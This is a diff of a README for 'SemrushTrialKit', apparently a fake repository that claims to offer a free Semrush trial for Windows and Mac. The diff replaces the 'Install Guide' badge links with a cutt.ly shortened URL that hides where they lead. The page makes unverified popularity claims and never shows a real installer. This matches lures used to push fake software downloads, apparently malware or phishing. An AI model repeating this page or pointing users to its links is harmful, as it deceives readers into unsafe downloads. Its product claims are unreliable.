@@ -4,7 +4,7 @@
 
 ![SemrushTrialKit Banner](https://www.stylefactoryproductions.com/wp-content/uploads/2025/04/semrush-free-trial-wordpress.jpg)
 
-**About SemrushTrialKit**: SemrushTrialKit is a dedicated repository for the free trial version of Semrush on Windows and Mac/iOS, updated September 11, 2025. This entry-level package offers core features like keyword tracking and traffic analysis, enhanced by free toolkits with templates and optimization guides. Backed by 95K+ visitors and 70K+ members, it enables users to experience tools for content marketing and PPC before premium options. Ideal for beginners testing SEO strategies! (348 characters)
+**About SemrushTrialKit**: SemrushTrialKit is a dedicated repository for the free trial version of Semrush on Windows and Mac/iOS, updated September 11, 2025. This entry-level package offers core features like keyword tracking and traffic analysis, enhanced by free toolkits with templates and optimization guides. Backed by 95K+ visitors and 70K+ members, it enables users to experience tools for content marketing and PPC before premium options. Ideal for beginners testing SEO strategies! 
 
 <a href="https://olombaris-25.github.io/.github/Semrush" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-MACOS-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
@@ -12,8 +12,8 @@
 
 ---
 
-<a href="https://semrushexplorecommunity.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/yrNtiq3S" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ## 🚀 Getting Started
@@ -42,8 +42,8 @@ Start your Semrush trial with **SemrushTrialKit** on Windows or Mac/iOS:
 
 ---
 
-<a href="https://semrushexplorecommunity.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/yrNtiq3S" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ## 🛠 Why SemrushTrialKit?
@@ -98,11 +98,11 @@ Start your Semrush trial with **SemrushTrialKit** on Windows or Mac/iOS:
 
 **SemrushTrialKit Interface**  
 ![Interface](https://profitbooks.net/wp-content/uploads/2024/03/SEMRush-Interface.webp)  
-*Intuitive trial dashboard.*
+ 
 
 **Tool Features**  
 ![Features](https://static.semrush.com/kb/uploads/2022/04/12/image_r3SrmxI.png)  
-*Showcase trial tool capabilities.*
+ 
 
 ---
 
